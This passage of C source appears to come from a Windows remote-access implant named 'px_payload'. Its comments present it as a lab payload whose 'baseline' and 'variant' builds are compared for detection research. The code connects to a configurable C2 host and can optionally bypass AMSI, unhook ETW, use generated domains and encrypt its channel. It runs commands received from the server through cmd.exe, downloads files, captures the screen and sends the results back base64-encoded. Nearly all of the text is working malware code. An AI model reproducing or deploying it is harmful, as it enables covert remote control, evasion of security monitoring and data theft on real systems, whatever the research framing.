            if (*fmt == '-') {
                left_justify = 1;
                fmt++;
                continue;
            }
            break;
        }

        /* width */
        while (*fmt >= '0' && *fmt <= '9') {
            width = width * 10 + (*fmt - '0');
            fmt++;
            if (width > 64)
                width = 64;
        }

        /* length modifier */
        if (*fmt == 'z') {
            longness = 3;
            fmt++;
        } else if (*fmt == 'h') {
            fmt++;
            if (*fmt == 'h')
                fmt++;
            longness = 0;
        } else if (*fmt == 'l') {
            fmt++;
            if (*fmt == 'l') {
                fmt++;
                longness = 2;
            } else {
                longness = 1;
            }
        }

        conv = *fmt;
        if (conv == '%') {
            out[o++] = '%';
            fmt++;
            continue;
        }

        if (conv == 's') {
            const char *s = PX_VA_ARG(ap, const char *);
            px_size_t len = 0;
            if (!s)
                s = "(null)";
            while (s[len] && len < 1024)
                len++;
            {
                /* The padding is only ever positive. Computing it as
                 * width - len without the guard underflows when no width
                 * was given (0 - len is a huge unsigned number), and the
                 * formatter then fills the buffer with spaces. */
                px_size_t pad = 0;
                if (width > 0 && (px_size_t)width > len)
                    pad = (px_size_t)width - len;
                px_size_t j;
                if (!left_justify) {
                    for (j = 0; j < pad && o + 1 < cap; j++)
                        out[o++] = zero_pad ? '0' : ' ';
                }
                for (j = 0; j < len && o + 1 < cap; j++)
                    out[o++] = s[j];
                if (left_justify) {
                    for (j = 0; j < pad && o + 1 < cap; j++)
                        out[o++] = ' ';
                }
            }
            fmt++;
            continue;
        }

        if (conv == 'd' || conv == 'i' || conv == 'u' ||
            conv == 'x' || conv == 'X' || conv == 'p') {
            char tmp[32];
            px_size_t n = 0;
            int negative = 0;
            int reverse_digits = 0;
            unsigned long long v = 0;

            if (conv == 'p') {
                /* A pointer does not fit in an unsigned long on Win64
                 * (LLP64: unsigned long is still 32-bit), so it is
                 * converted through uintptr_t, which is the type that is
                 * guaranteed to hold a pointer. */
                v = (unsigned long long)(uintptr_t)
                    PX_VA_ARG(ap, void *);
            } else if (conv == 'd' || conv == 'i') {
                long long sv;
                switch (longness) {
                case 1:
                    sv = PX_VA_ARG(ap, long);
                    break;
                case 2:
                    sv = PX_VA_ARG(ap, long long);
                    break;
                case 3:
                    sv = (long long)PX_VA_ARG(ap, size_t);
                    break;
                default:
                    sv = PX_VA_ARG(ap, int);
                    break;
                }
                if (sv < 0) {
                    negative = 1;
                    /* negate in unsigned space so LONG_MIN is safe */
                    v = (unsigned long long)(-(sv + 1)) + 1ULL;
                } else {
                    v = (unsigned long long)sv;
                }
            } else {
                switch (longness) {
                case 1:
                    v = (unsigned long long)
                        PX_VA_ARG(ap, unsigned long);
                    break;
                case 2:
                    v = PX_VA_ARG(ap, unsigned long long);
                    break;
                case 3:
                    v = (unsigned long long)
                        PX_VA_ARG(ap, size_t);
                    break;
                default:
                    v = (unsigned long long)
                        PX_VA_ARG(ap, unsigned int);
                    break;
                }
            }

            if (conv == 'x' || conv == 'X' || conv == 'p') {
                const char *hex = (conv == 'X') ? "0123456789ABCDEF"
                                               : "0123456789abcdef";
                /* Hex digits are produced least-significant first, so the
                 * buffer is reversed below. */
                if (!v)
                    tmp[n++] = '0';
                while (v && n < 30) {
                    tmp[n++] = hex[v & 0xF];
                    v >>= 4;
                }
                reverse_digits = 1;
            } else {
                px_size_t k;
                if (negative)
                    tmp[n++] = '-';
                /* px_utoa64 already produces the digits in the correct
                 * order. Reversing them a second time turns 39999 into
                 * 99993, so the buffer is used as it stands. */
                k = px_utoa64(v, tmp + n);
                n += k;
                reverse_digits = 0;
            }

            /* reverse into place */
            {
                char rev[32];
                px_size_t total = n;
                px_size_t j;
                px_size_t pad;
                if (reverse_digits) {
                    for (j = 0; j < total; j++)
                        rev[j] = tmp[total - 1 - j];
                } else {
                    for (j = 0; j < total; j++)
                        rev[j] = tmp[j];
                }
                /* Only ever positive: 0 - total underflows to a huge
                 * unsigned number when no width was given, and the
                 * formatter then fills the buffer with spaces. */
                pad = 0;
                if (width > 0 && (px_size_t)width > total)
                    pad = (px_size_t)width - total;
                if (!left_justify) {
                    /* keep the sign ahead of the zero padding */
                    px_size_t sign = (rev[0] == '-') ? 1 : 0;
                    for (j = 0; j < sign && o + 1 < cap; j++)
                        out[o++] = rev[j];
                    for (j = 0; j < pad && o + 1 < cap; j++)
                        out[o++] = zero_pad ? '0' : ' ';
                    for (j = sign; j < total && o + 1 < cap; j++)
                        out[o++] = rev[j];
                } else {
                    for (j = 0; j < total && o + 1 < cap; j++)
                        out[o++] = rev[j];
                    for (j = 0; j < pad && o + 1 < cap; j++)
                        out[o++] = ' ';
                }
            }
            fmt++;
            continue;
        }

        out[o++] = '%';
    }
    out[o] = '\0';
    return o;
}

/* The variadic entry point.
 *
 * px_vfmt_va does the work and takes a va_list; this wrapper starts and
 * ends the list. MSVC's va_list is a pointer and GCC's is an array, so
 * the wrapper is the only place that has to know the difference -- and
 * it does not, because va_start/va_end/va_arg are spelled the same way
 * on both once <stdarg.h> or the builtin is used. */
static px_size_t px_vfmt(char *out, px_size_t cap, const char *fmt, ...)
{
    px_va_list ap;
    px_size_t n;
    PX_VA_START(ap, fmt);
    n = px_vfmt_va(out, cap, fmt, ap);
    PX_VA_END(ap);
    return n;
}

static px_size_t px_fmt(char *out, px_size_t cap, const char *fmt, ...)
{
    px_va_list ap;
    px_size_t n;
    PX_VA_START(ap, fmt);
    n = px_vfmt_va(out, cap, fmt, ap);
    PX_VA_END(ap);
    return n;
}

/* A bounded snprintf that always terminates.
 *
 * Returns the length that WOULD have been written, so the caller can
 * detect truncation the way the C standard says it should.
 *
 * The implementation is the payload's OWN formatter, not the CRT's
 * _vsnprintf: this file is built with /NODEFAULTLIB and links no CRT,
 * so the CRT version is not there to call. */
unsigned int px_snprintf(char *out, unsigned int cap, const char *fmt, ...)
{
    px_va_list ap;
    px_size_t n;

    if (cap == 0)
        return 0;
    PX_VA_START(ap, fmt);
    n = px_vfmt_va(out, cap, fmt, ap);
    PX_VA_END(ap);
    out[cap - 1] = '\0';
    return (unsigned int)n;
}

static void px_logf(const char *fmt, ...)
{
    char buf[2048];
    px_va_list ap;
    px_size_t n;
    PX_VA_START(ap, fmt);
    n = px_vfmt_va(buf, sizeof(buf), fmt, ap);
    PX_VA_END(ap);
    px_emit(buf, n);
}

/* Run a command and capture its output.
 *
 * This is the wrapper the variant modules use. It exists because
 * run_command is declared after them in the file, and because the
 * variants should not have to know how the output is captured.
 *
 * The returned buffer is heap-allocated and the caller frees it. */
static char *run_command(const char *cmd, long *exit_code);

char *px_run_capture(const char *cmd, char *out, unsigned int cap, long *rc)
{
    return run_command(cmd, rc);
}

/* ================================================================== */
/* base64                                                             */
/* ================================================================== */
static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *b64_encode(const unsigned char *in, px_size_t len)
{
    px_size_t out_len = ((len + 2) / 3) * 4;
    char *out = (char *)HeapAlloc(GetProcessHeap(), 0, out_len + 1);
    px_size_t i, o = 0;

    if (!out)
        return NULL;
    for (i = 0; i + 2 < len; i += 3) {
        unsigned v = (in[i] << 16) | (in[i + 1] << 8) | in[i + 2];
        out[o++] = B64[(v >> 18) & 0x3F];
        out[o++] = B64[(v >> 12) & 0x3F];
        out[o++] = B64[(v >> 6) & 0x3F];
        out[o++] = B64[v & 0x3F];
    }
    if (i < len) {
        unsigned v = in[i] << 16;
        px_size_t rem = len - i;
        if (rem == 2)
            v |= in[i + 1] << 8;
        out[o++] = B64[(v >> 18) & 0x3F];
        out[o++] = B64[(v >> 12) & 0x3F];
        out[o++] = (rem == 2) ? B64[(v >> 6) & 0x3F] : '=';
        out[o++] = '=';
    }
    out[o] = '\0';
    return out;
}

/* ================================================================== */
/* helpers                                                            */
/* ================================================================== */

/* MSVC's stack-probe helper.
 *
 * The compiler emits a call to __chkstk when a function needs more than
 * one page of stack, so that the guard pages are touched as the stack
 * grows. It normally comes from the CRT, which this payload does not link.
 *
 * Rather than reimplement a compiler intrinsic in assembly, the build
 * raises the stack-probe threshold with /Gs so that the compiler never
 * emits the call in the first place. The largest frame in this file is
 * about 5KB (wbuf[2048] plus wcmd[3072] plus the rest), well inside the
 * 1MB default stack, so probing is not needed here.
 *
 * MinGW needs none of this: GCC does not reference __chkstk.
 */
#if defined(_MSC_VER)
void __chkstk(unsigned long size);
/* Provided as a stub so that a link against a CRT-flavoured build still
 * resolves. With /Gs raised the compiler does not call it. */
void __chkstk(unsigned long size)
{
    (void)size;
}
#endif

static int send_all(PX_SOCKET s, const char *buf, int len, fn_send p_send)
{
    int sent = 0;
    while (sent < len) {
        int n = p_send(s, buf + sent, len - sent, 0);
        if (n <= 0)
            return -1;
        sent += n;
    }
    return 0;
}

/* Send a protocol line.
 *
 * In the baseline arm this is the line followed by CRLF, in the clear.
 * In the encrypted arm the line is encrypted and framed with its
 * plaintext length, so that both ends can find the frame boundary
 * without a separate length channel.
 *
 * The framing is per LINE, which means a dropped line cannot
 * desynchronise the keystream: each line's keystream position depends
 * only on the lines before it, and a frame that does not arrive intact
 * is discarded whole. */
static int send_line(PX_SOCKET s, const char *line, int len, fn_send p_send)
{
#if PX_ENCRYPT
    if (px_ks_active()) {
        unsigned char frame[2048];
        unsigned int flen = px_ks_encrypt(line, (unsigned int)len, frame,
                                          (unsigned int)sizeof(frame));
        if (flen == 0) {
            /* The frame did not fit. Fall back to the clear encoding
             * rather than truncating the message, and let the server
             * notice the mismatch. */
            px_logf(g_vocab.log_large);
        } else {
            return send_all(s, (const char *)frame, (int)flen, p_send);
        }
    }
#endif
    {
        char out[2048];
        int n = len;
        if (n + 2 > (int)sizeof(out))
            n = (int)sizeof(out) - 2;
        memcpy(out, line, (size_t)n);
        out[n] = '\r';
        out[n + 1] = '\n';
        return send_all(s, out, n + 2, p_send);
    }
}

static void write_marker(void)
{
    char full[MAX_PATH];
    HANDLE h;
    char host[256];
    DWORD hn = sizeof(host);
    SYSTEMTIME st;
    char line[512];
    px_size_t n;

    GetLocalTime(&st);
    GetComputerNameA(host, &hn);

    px_path_next_to_image(full, MAX_PATH, "px_payload_running.txt");

    h = CreateFileA(full, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                    OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return;
    SetFilePointer(h, 0, NULL, FILE_END);

    n = px_fmt(line, sizeof(line),
               "px_payload executed\r\n  pid  : %lu\r\n  host : %s\r\n"
               "  time : %04lu-%02lu-%02lu %02lu:%02lu:%02lu\r\n",
               (unsigned long)GetCurrentProcessId(), host,
               (unsigned long)st.wYear, (unsigned long)st.wMonth,
               (unsigned long)st.wDay, (unsigned long)st.wHour,
               (unsigned long)st.wMinute, (unsigned long)st.wSecond);
    WriteFile(h, line, (DWORD)n, NULL, NULL);
    CloseHandle(h);
}

/* ================================================================== */
/* command execution with captured output                             */
/* ================================================================== */
static char *run_command(const char *cmd, long *exit_code)
{
    SECURITY_ATTRIBUTES sa;
    HANDLE rd, wr;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    wchar_t wbuf[2048];
    wchar_t wcmd[3072];
    char *buf;
    px_size_t cap = 32768, len = 0;
    int wlen;
    DWORD got;

    *exit_code = -1;

    wlen = MultiByteToWideChar(CP_ACP, 0, cmd, -1, wbuf, 2048);
    if (wlen <= 0)
        wbuf[0] = L'\0';
    else
        wbuf[2047] = L'\0';

    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&rd, &wr, &sa, 0))
        return NULL;
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    {
        /* build "cmd.exe /d /s /c "<cmd>"" without CRT formatting */
        const char *a = "cmd.exe /d /s /c \"";
        int i = 0, j;
        for (j = 0; a[j] && i < 3000; j++, i++)
            wcmd[i] = (wchar_t)(unsigned char)a[j];
        for (j = 0; wbuf[j] && i < 3000; j++, i++)
            wcmd[i] = wbuf[j];
        if (i < 3000)
            wcmd[i++] = L'"';
        wcmd[i] = L'\0';
    }

    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessW(NULL, wcmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(rd);
        CloseHandle(wr);
        return NULL;
    }
    CloseHandle(wr);

    buf = (char *)HeapAlloc(GetProcessHeap(), 0, cap);
    if (!buf) {
        CloseHandle(rd);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return NULL;
    }

    for (;;) {
        if (len + 4096 > cap) {
            char *nb;
            cap *= 2;
            nb = (char *)HeapReAlloc(GetProcessHeap(), 0, buf, cap);
            if (!nb)
                break;
            buf = nb;
        }
        if (!ReadFile(rd, buf + len, 4096, &got, NULL) || got == 0)
            break;
        len += got;
    }

    WaitForSingleObject(pi.hProcess, 15000);
    GetExitCodeProcess(pi.hProcess, (DWORD *)exit_code);

    CloseHandle(rd);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (!buf)
        return NULL;
    buf[len] = '\0';
    return buf;
}

/* ================================================================== */
/* entry point                                                        */
/* ================================================================== */
#ifndef PX_DEFAULT_HOST
#define PX_DEFAULT_HOST "127.0.0.1"
#endif
#ifndef PX_DEFAULT_PORT
#define PX_DEFAULT_PORT 9001
#endif

/* Read a string from the environment. WinAPI only -- no CRT involved.
 * Used so the lab operator can retarget the payload at the operator host
 * without recompiling. */
static int px_env(const char *name, char *out, int cap)
{
    DWORD n = GetEnvironmentVariableA(name, out, (DWORD)cap);
    if (n == 0 || n >= (DWORD)cap)
        return 0;
    return 1;
}

/* The endpoint resolution.
 *
 * It is included HERE, at file scope and after px_strcpy, px_strchr and
 * px_env are defined, because it uses all three. An include cannot sit
 * inside a function body, and including it earlier made the compiler
 * implicitly declare the helpers, which then collided with their real
 * definitions. */
#include "px_endpoints.c"

/* The capability library.
 *
 * It uses the payload's helpers and the Winsock wrappers, so it is
 * included after them -- and BEFORE the command handlers, because those
 * handlers call into it.
 *
 * The Winsock functions it needs are handed over by the payload after
 * they are resolved at runtime, so the library shares the payload's
 * socket layer rather than carrying a second copy of it. */
#include "px_capabilities.c"

/* ------------------------------------------------------------------ */
/* The capability command                                              */
/* ------------------------------------------------------------------ */
/*                                                                       */
/* The server sends:                                                    */
/*                                                                       */
/*     CAP|<name>|<arguments>                                          */
/*                                                                       */
/* and the payload looks the name up in the capability table. One verb   */
/* for every technique would mean changing the protocol every time      */
/* something was added, and the two would drift.                        */
/*                                                                       */
/* Returns 1 if the command was handled, 0 if the line was not a        */
/* capability command.                                                  */
/* ------------------------------------------------------------------ */
static int px_handle_cap_cmd(PX_SOCKET sock, fn_send p_send,
                             char *line, int *handled)
{
    char *name;
    char *args;
    char report[2048];
    char *b64;
    static char reply[65536];
    px_size_t rn;

    *handled = 0;

    if (px_strncmp(line, g_vocab.cap_cmd, 4) != 0)
        return 0;

    *handled = 1;
    name = line + 4;
    args = px_strchr(name, '|');
    if (args) {
        *args = '\0';
        args++;
    } else {
        args = name + px_strlen(name);
    }

#if PX_CAPABILITIES
    if (!px_cap_run(name, args, report, sizeof(report))) {
        px_snprintf(report, sizeof(report),
                    "unknown capability '%s'", name);
    }
#else
    px_snprintf(report, sizeof(report),
                "this build has no capability library compiled in");
#endif

    px_logf(g_vocab.log_cap, name, report);
    b64 = b64_encode((const unsigned char *)report, (px_size_t)px_strlen(report));
    rn = px_fmt(reply, sizeof(reply), g_vocab.f_result,
                "cap", b64 ? b64 : "", 0);
    send_line(sock, reply, (int)rn, p_send);
    if (b64)
        HeapFree(GetProcessHeap(), 0, b64);
    return 1;
}

/* The file transfer and screen capture capabilities.
 *
 * They use px_fmt, b64_encode and send_line, so they are included after
 * all three are defined. */
#include "px_file.c"

/* ------------------------------------------------------------------ */
/* The transfer commands                                               */
/* ------------------------------------------------------------------ */
/*                                                                       */
/* Both the plain and the encrypted receive paths handle these, and     */
/* they must behave identically -- a capability that works in one arm    */
/* and silently does nothing in the other is a bug that would look    */
/* like a missing capability.                                           */
/*                                                                       */
/* So the logic lives HERE, once, and the two paths call it.            */
/*                                                                       */
/* Returns 1 if the command was handled, 0 if the line was not one    */
/* of these commands.                                                   */
/* ------------------------------------------------------------------ */
static int px_handle_transfer_cmd(PX_SOCKET sock, fn_send p_send,
                                  char *line, int *handled)
{
    char *cmd_id;
    char *path;
    char report[256];
    long rc = -1;
    char *b64;
    static char reply[65536];
    px_size_t rn;

    *handled = 0;

    if (px_strncmp(line, g_vocab.download, 3) == 0) {
        *handled = 1;
        cmd_id = line + 3;
        path = px_strchr(cmd_id, '|');
        if (!path)
            return 1;
        *path = '\0';
        path++;

#if PX_FILE_TRANSFER
        rc = px_file_download(sock, p_send, cmd_id, path);
        if (rc == 0)
            px_snprintf(report, sizeof(report),
                        "transfer of %s completed", path);
        else
            px_snprintf(report, sizeof(report),
                        "transfer of %s failed", path);
#else
        px_snprintf(report, sizeof(report),
                    "this build has no file transfer capability");
#endif
    } else if (px_strncmp(line, g_vocab.screenshot, 5) == 0) {
        *handled = 1;
        cmd_id = line + 5;
        {
            char *bar = px_strchr(cmd_id, '|');
            if (bar)
                *bar = '\0';
        }
#if PX_SCREENSHOT
        rc = px_screen_capture(sock, p_send, cmd_id);
        if (rc == 0)
            px_snprintf(report, sizeof(report), "screen capture completed");
        else
            px_snprintf(report, sizeof(report), "screen capture failed");
#else
        px_snprintf(report, sizeof(report),
                    "this build has no screen capture capability");
#endif
    } else {
        return 0;
    }

    px_logf(g_vocab.log_transfer, cmd_id, report);
    b64 = b64_encode((const unsigned char *)report, (px_size_t)px_strlen(report));
    rn = px_fmt(reply, sizeof(reply), g_vocab.f_result,
                cmd_id, b64 ? b64 : "", rc);
    send_line(sock, reply, (int)rn, p_send);
    if (b64)
        HeapFree(GetProcessHeap(), 0, b64);
    return 1;
}

__declspec(dllexport) void px_entry(void)
{
    PX_SOCKET sock;
    PX_SOCKADDR_IN addr;
    static char recvbuf[16384];
    px_size_t used = 0;
    char host[256];
    DWORD hn = sizeof(host);
    /* The C2 host.
     *
     * A buffer, not a pointer, because the domain generation variant
     * REPLACES it with a generated name. A const char* would have made
     * that a compile error, and a char* pointing at the compiled-in
     * default would have written into the read-only image. */
    char c2host[256];
    const char *c2host_default = PX_DEFAULT_HOST;
    int c2port = PX_DEFAULT_PORT;
    int is64 = 0;
    char env_host[256];
    char env_port[256];
    fn_wsastartup p_wsastartup = NULL;
    fn_wsacleanup p_wsacleanup = NULL;
    fn_socket p_socket = NULL;
    fn_connect p_connect = NULL;
    fn_send p_send = NULL;
    fn_recv p_recv = NULL;
    fn_closesocket p_closesocket = NULL;
    fn_inet_addr p_inet_addr = NULL;
    fn_htons p_htons = NULL;
    fn_getlasterror p_wsalasterror = NULL;
    fn_gethostbyname p_gethostbyname = NULL;
    PX_WSADATA wsa;
    unsigned int attempt = 0;

    write_marker();

    /* The protocol vocabulary.
     *
     * Filled before anything uses it. In the obfuscated build this is
     * what removes the protocol keywords from the binary; in the
     * baseline build it just copies the literals into the same place so
     * that both arms run the same code. */
    px_vocab_init();

    /* ------------------------------------------------------------------ */
    /* The variant hooks.                                                  */
    /* ------------------------------------------------------------------ */
    /* These run BEFORE anything else, so that the payload's own behaviour */
    /* is already unhooked by the time the first event is generated. That  */
    /* is the ordering that matters: a bypass applied after the fact     */
    /* would leave the early events visible, which is not what the variant */
    /* is supposed to demonstrate.                                        */
    if (PX_AMSI_BYPASS) {
        if (px_amsi_bypass())
            px_logf(g_vocab.log_amsi_ok);
        else
            px_logf(g_vocab.log_amsi_fail);
    }
    if (PX_ETW_UNHOOK) {
        if (px_etw_unhook())
            px_logf(g_vocab.log_etw_ok);
        else
            px_logf(g_vocab.log_etw_fail);
    }
    if (PX_ENCRYPT) {
        /* The key is READ here, but the keystream is NOT set up yet.
         *
         * The handshake -- HELLO and CAPS -- has to go out in the
         * clear, because the server does not know whether the session
         * is encrypted until it has read the CAPS line. Setting the
         * keystream up before the handshake meant the first frame was
         * encrypted and the server read it as plaintext, and the
         * session died at the first exchange.
         *
         * So: read the key now, build the keystream after the
         * handshake. */
        px_ks_readkey();
        px_logf(g_vocab.log_enc_on,
                px_ks_active() ? "enabled" : "unavailable (no key)");
    }

    /* PX_C2_HOST / PX_C2_PORT override the compiled-in defaults.
     * NOTE: two separate buffers. They must not alias: c2host points at
     * env_host, so reusing one buffer for both reads would clobber the
     * host with the port string. */
    if (px_env(g_vocab.env_c2_host, env_host, sizeof(env_host)) && env_host[0])
        px_strcpy(c2host, env_host, sizeof(c2host));
    else
        px_strcpy(c2host, c2host_default, sizeof(c2host));
    if (px_env(g_vocab.env_c2_port, env_port, sizeof(env_port)) && env_port[0]) {
        int p = 0;
        const char *c = env_port;
        while (*c >= '0' && *c <= '9')
            p = p * 10 + (*c++ - '0');
        if (p > 0 && p < 65536)
            c2port = p;
    }

    /* The domain generation variant.
     *
     * The generated host replaces the resolved one. It has to be
     * resolved by NAME rather than parsed as an address, so the payload
     * needs gethostbyname, which comes from ws2_32 like everything else
     * here. */
    if (PX_DGA) {
        char dga[256];
        unsigned int dn = px_dga_host(dga, sizeof(dga));
        if (dn > 0) {
            px_strcpy(c2host, dga, sizeof(c2host));
            px_logf(g_vocab.log_dga, c2host);
        }
    }

    write_marker();

    {
        HMODULE hws;
        hws = LoadLibraryA(g_vocab.ws2_32);
        if (!hws) {
            px_logf(g_vocab.log_ws_fail,
                    (unsigned long)GetLastError());
            return;
        }
        p_wsastartup = (fn_wsastartup)px_proc(hws, "WSAStartup");
        p_wsacleanup = (fn_wsacleanup)px_proc(hws, "WSACleanup");
        p_socket = (fn_socket)px_proc(hws, "socket");
        p_connect = (fn_connect)px_proc(hws, "connect");
        p_send = (fn_send)px_proc(hws, "send");
        p_recv = (fn_recv)px_proc(hws, "recv");
        p_closesocket = (fn_closesocket)px_proc(hws, "closesocket");
        p_inet_addr = (fn_inet_addr)px_proc(hws, "inet_addr");
        p_htons = (fn_htons)px_proc(hws, "htons");
        p_wsalasterror = (fn_getlasterror)px_proc(hws, "WSAGetLastError");
        /* Hand the resolved Winsock functions to the capability library,
         * so the port scan and the C2 session share one socket layer
         * rather than two copies of it. */
#if PX_CAPABILITIES
        px_cap_set_sockets((PX_SOCKET (*)(int, int, int))p_socket,
                           (int (*)(PX_SOCKET, const void *, int))p_connect,
                           (int (*)(PX_SOCKET))p_closesocket,
                           (unsigned long (*)(const char *))p_inet_addr,
                           (unsigned short (*)(unsigned short))p_htons);
#endif
        p_gethostbyname = (fn_gethostbyname)px_proc(hws, "gethostbyname");
        if (!p_wsastartup || !p_socket || !p_connect || !p_send || !p_recv) {
            px_logf(g_vocab.log_ws_exports);
            return;
        }
    }
    if (p_wsastartup(0x0202, &wsa) != 0) {
        px_logf(g_vocab.log_wsa_fail);
        return;
    }

    {
        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        is64 = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);
    }

    /* ------------------------------------------------------------------ */
    /* Connect.                                                             */
    /* ------------------------------------------------------------------ */
connect_again:
    /* The connect is inside a retry loop, and the target is a LIST of      */
    /* endpoints rather than one address.                                   */
    /*                                                                       */
    /* WHY                                                                 */
    /* The lab has to work on whatever network the operator is on today:     */
    /* the office wifi, a mobile hotspot, a hotel. A payload that connects  */
    /* to one hardcoded address only works on the network that address is   */
    /* on, and dies silently the moment the operator moves.                 */
    /*                                                                       */
    /* So the endpoint is a NAME, resolved every time, and a domain with    */
    /* several A records gives failover for free. The port list handles    */
    /* networks that block the lab's port. The backoff handles a laptop    */
    /* that changes network mid-session.                                    */
    /*                                                                       */
    /* The baseline arm keeps the old behaviour -- one address, one        */
    /* attempt, exit on failure -- because it is the comparison arm.       */
    for (attempt = 0;; attempt++) {
        px_endpoint_set eps;
        unsigned int naddrs;
        unsigned int ai;
        int connected = 0;

#if PX_RESILIENT
        {
            unsigned int wait_s = px_backoff_for(attempt);
            if (wait_s) {
                px_logf(g_vocab.log_backoff, (unsigned long)wait_s);
                Sleep(wait_s * 1000);
            }
        }
#endif

        naddrs = px_endpoints_resolve(&eps, c2host, (unsigned int)c2port,
                                       p_gethostbyname, p_inet_addr);
        if (naddrs == 0) {
            px_logf(g_vocab.log_no_resolve, c2host);
#if PX_RESILIENT
            continue;
#else
            p_wsacleanup();
            return;
#endif
        }

        for (ai = 0; ai < naddrs && !connected; ai++) {
            sock = p_socket(PX_AF_INET, PX_SOCK_STREAM, 6);
            if (sock == PX_INVALID_SOCKET) {
                px_logf(g_vocab.log_sock_fail, (unsigned long)p_wsalasterror());
                break;
            }

            memset(&addr, 0, sizeof(addr));
            addr.sin_family = PX_AF_INET;
            addr.sin_port = p_htons((unsigned short)eps.addrs[ai].port);
            addr.sin_addr = eps.addrs[ai].addr;

            px_logf(g_vocab.log_connecting, c2host,
                    (unsigned int)eps.addrs[ai].port);
            if (p_connect(sock, &addr, sizeof(addr)) != 0) {
                px_logf(g_vocab.log_conn_fail, (unsigned long)p_wsalasterror());
                p_closesocket(sock);
                sock = PX_INVALID_SOCKET;
                continue;
            }
            connected = 1;
        }

        if (!connected) {
#if PX_RESILIENT
            continue;
#else
            p_wsacleanup();
            return;
#endif
        }
        break;
    }

    px_logf(g_vocab.log_connected);

    GetComputerNameA(host, &hn);
    {
        char line[1024];
        px_size_t n = px_fmt(line, sizeof(line), g_vocab.f_hello,
                             is64 ? "x64" : "x86",
                             (unsigned long)GetCurrentProcessId(), host);
        send_line(sock, line, (int)n, p_send);
    }

    /* The capability report.
     *
     * The server has to know which arm it is talking to, otherwise the
     * audit log cannot distinguish a baseline run from a variant run and
     * the comparison between them is impossible. */
    {
        char line[64];
        px_size_t n = px_fmt(line, sizeof(line), g_vocab.f_caps,
                             (unsigned long)PX_CAP_MASK);
        send_line(sock, line, (int)n, p_send);
    }

    /* The handshake is done. NOW the channel becomes encrypted.
     *
     * The HELLO and CAPS lines above travel in the clear on purpose:
     * the server learns from the CAPS line that the session is
     * encrypted, and a CAPS line that was itself encrypted could never
     * be read. From this point on every frame in both directions is
     * encrypted. */
    if (PX_ENCRYPT)
        px_ks_setup();

    for (;;) {
        int n;
        px_size_t consumed;

#if PX_ENCRYPT
        /* The encrypted arm reads whole FRAMES, not lines.
         *
         * A frame is a 4-byte plaintext length followed by that many
         * encrypted bytes. The length is in the clear, which is
         * deliberate: it means a defender can still see the size of
         * every message, and the lab can measure what that alone gives
         * away. */
        if (px_ks_active()) {
            unsigned char hdr[4];
            unsigned int plainlen;
            unsigned int got = 0;
            unsigned char *frame;
            char plain[2048];
            unsigned int plen;

            while (got < 4) {
                int r = p_recv(sock, (char *)hdr + got, (int)(4 - got), 0);
                if (r <= 0) {
                    px_logf(g_vocab.log_closed);
                    goto done;
                }
                got += (unsigned int)r;
            }
            plainlen = (unsigned int)hdr[0] | ((unsigned int)hdr[1] << 8) |
                       ((unsigned int)hdr[2] << 16) | ((unsigned int)hdr[3] << 24);
            if (plainlen == 0 || plainlen > sizeof(plain)) {
                px_logf(g_vocab.log_frame_len, (unsigned long)plainlen);
                goto done;
            }
            /* The frame is the header AND the body.
             *
             * px_ks_decrypt reads the length out of the first four bytes
             * and checks that the total length matches, so it has to be
             * given the whole frame. An earlier version passed only the
             * body, so the length check failed on every frame and the
             * session died at the first exchange -- with a log line that
             * said the frame failed to decode, which pointed at the
             * cipher rather than at the framing. */
            frame = (unsigned char *)HeapAlloc(GetProcessHeap(), 0,
                                               plainlen + 4);
            if (!frame)
                goto done;
            memcpy(frame, hdr, 4);
            got = 0;
            while (got < plainlen) {
                int r = p_recv(sock, (char *)frame + 4 + got,
                               (int)(plainlen - got), 0);
                if (r <= 0) {
                    HeapFree(GetProcessHeap(), 0, frame);
                    px_logf(g_vocab.log_closed);
                    goto done;
                }
                got += (unsigned int)r;
            }
            plen = px_ks_decrypt(frame, plainlen + 4, plain, sizeof(plain));
            HeapFree(GetProcessHeap(), 0, frame);
            if (plen == 0) {
                px_logf(g_vocab.log_frame_bad);
                goto done;
            }
            {
                char *bar1, *bar2;
                int handled = 0;
                if (px_strncmp(plain, g_vocab.ping, 4) == 0) {
                    send_line(sock, g_vocab.pong, 4, p_send);
                } else if (px_strncmp(plain, g_vocab.exit, 4) == 0) {
                    px_logf(g_vocab.log_exit);
                    goto done;
                } else if (px_handle_cap_cmd(sock, p_send, plain,
                                            &handled)) {
                    /* A capability from the library. */
                } else if (px_handle_transfer_cmd(sock, p_send, plain,
                                                  &handled)) {
                    /* The file download or the screen capture. */
                } else if (px_strncmp(plain, g_vocab.exec, 5) == 0) {
                    char *cmd_id = plain + 5;
                    char *cmd;
                    long rc = -1;
                    char *out, *b64;
                    static char reply[65536];

                    bar1 = px_strchr(cmd_id, '|');
                    if (!bar1)
                        continue;
                    *bar1 = '\0';
                    cmd = bar1 + 1;
                    bar2 = px_strchr(cmd, '|');
                    if (bar2)
                        *bar2 = '\0';

                    px_logf(g_vocab.log_exec, cmd_id, cmd);
                    out = run_command(cmd, &rc);
                    b64 = b64_encode((const unsigned char *)((out && out[0]) ? out : ""),
                                     out ? px_strlen(out) : 0);
                    {
                        px_size_t rn = px_fmt(reply, sizeof(reply),
                                              g_vocab.f_result,
                                              cmd_id, b64 ? b64 : "", rc);
                        send_line(sock, reply, (int)rn, p_send);
                    }
                    if (b64)
                        HeapFree(GetProcessHeap(), 0, b64);
                    if (out)
                        HeapFree(GetProcessHeap(), 0, out);
